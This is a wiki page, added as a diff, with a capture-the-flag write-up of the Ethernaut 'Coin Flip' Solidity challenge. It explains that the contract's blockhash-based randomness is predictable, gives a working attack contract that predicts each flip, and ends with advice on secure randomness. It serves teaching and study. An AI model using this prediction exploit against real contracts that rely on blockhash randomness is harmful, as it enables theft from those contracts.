@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/CTF/blockchain/Ethernaut/Coin%20Flip/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>3.Coin Flip - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "3.Coin Flip", url: "#_top", children: [
+              {title: "\u9898\u76ee\u63cf\u8ff0", url: "#_1" },
+              {title: "\u89e3\u9898\u8fc7\u7a0b", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Delegation/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Delegation/" class="btn btn-xs btn-link">
+        6.Delegation
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../" class="btn btn-xs btn-link">
+        区块链
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="3coin-flip">3.Coin Flip<a class="headerlink" href="#3coin-flip" title="Permanent link">&para;</a></h1>
+<h2 id="_1">题目描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><img alt="img" src="../../../.vuepress/public/img/1645011948059-f3f2ea31-ba84-45db-b702-a7d7b2e428b1.png" /></p>
+<h2 id="_2">解题过程<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>题目源码</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>
+
+<span class="k">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">CoinFlip</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">  </span><span class="nx">using</span><span class="w"> </span><span class="nx">SafeMath</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">uint256</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">consecutiveWins</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastHash</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
+
+<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">flip</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="p">.</span><span class="nx">sub</span><span class="p">(</span><span class="mf">1</span><span class="p">)));</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">lastHash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">revert</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">lastHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">.</span><span class="nx">div</span><span class="p">(</span><span class="nx">FACTOR</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">side</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>这里通过计算上一区块的信息与一个固定的数值相计算，就不存在随机的情况了，除了第一次的上一区块随机，其他均为可知的值</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645054208418-cc8c6e81-78ce-4c64-846c-099cbc532ac2.png" /></p>
+<p>直接使用原合约的计算方法，部署攻击合约</p>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Attack</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">using</span><span class="w"> </span><span class="nx">SafeMath</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">uint256</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
+
+<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x36D583674B7afE99c0c8FDE510BbA46ec7b96531</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">CoinFlip</span><span class="w"> </span><span class="nx">coin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CoinFlip</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">attack</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="p">.</span><span class="nx">sub</span><span class="p">(</span><span class="mf">1</span><span class="p">)));</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">.</span><span class="nx">div</span><span class="p">(</span><span class="nx">FACTOR</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">coin</span><span class="p">.</span><span class="nx">flip</span><span class="p">(</span><span class="nx">side</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>调用10次完成关卡</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645054867204-01557284-20da-4ba5-b878-41839a6cd94c.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="nx">通过solidity产生随机数没有那么容易</span><span class="p">.</span><span class="w"> </span><span class="nx">目前没有一个很自然的方法来做到这一点</span><span class="p">,</span><span class="w"> </span><span class="nx">而且你在智能合约中做的所有事情都是公开可见的</span><span class="p">,</span><span class="w"> </span><span class="nx">包括本地变量和被标记为私有的状态变量</span><span class="p">.</span><span class="w"> </span><span class="nx">矿工可以控制</span><span class="w"> </span><span class="nx">blockhashes</span><span class="p">,</span><span class="w"> </span><span class="nx">时间戳</span><span class="p">,</span><span class="w"> </span><span class="nx">或是是否包括某个交易</span><span class="p">,</span><span class="w"> </span><span class="nx">这可以让他们根据他们目的来左右这些事情</span><span class="p">.</span>
+<span class="nx">想要获得密码学上的随机数</span><span class="p">,</span><span class="nx">你可以使用</span><span class="w"> </span><span class="nx">Chainlink</span><span class="w"> </span><span class="nx">VRF</span><span class="p">,</span><span class="w"> </span><span class="nx">它使用预言机</span><span class="p">,</span><span class="w"> </span><span class="nx">LINK</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">和一个链上合约来检验这是不是真的是一个随机数</span><span class="p">.</span>
+<span class="nx">一些其它的选项包括使用比特币block</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="p">(</span><span class="nx">通过验证</span><span class="w"> </span><span class="nx">BTC</span><span class="w"> </span><span class="nx">Relay</span><span class="p">),</span><span class="w"> </span><span class="nx">RANDAO</span><span class="p">,</span><span class="w"> </span><span class="nx">或是</span><span class="w"> </span><span class="nx">Oraclize</span><span class="p">).</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Delegation/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Delegation/" class="btn btn-xs btn-link">
+        6.Delegation
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../" class="btn btn-xs btn-link">
+        区块链
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
